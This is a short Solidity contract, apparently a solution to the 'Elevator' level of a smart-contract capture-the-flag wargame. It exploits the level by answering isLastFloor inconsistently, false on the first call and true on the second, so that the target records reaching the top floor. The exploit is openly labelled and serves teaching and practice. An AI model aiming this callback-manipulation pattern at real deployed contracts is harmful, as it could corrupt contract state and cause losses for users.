// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../levels/level11.sol";
import "forge-std/console.sol";

contract ElevatorAttack is Building
{
    Elevator elevator = Elevator(0x95447Bd7164303900C4489132Fb88D2cA4fFd312);
    bool public switchFlipped =  false; 

    function goTo() public
    {
        console.log("calling the go to function");
        elevator.goTo(3);
    }

    function isLastFloor(uint _floor) public returns(bool)
    {
        console.log("calling islast function function", _floor);
        if (! switchFlipped) {
            switchFlipped = true;
            console.log("return false");
            return false;
        // second call
        } else {

            console.log("return true");
            switchFlipped = false;
            return true;
        }
    }
}
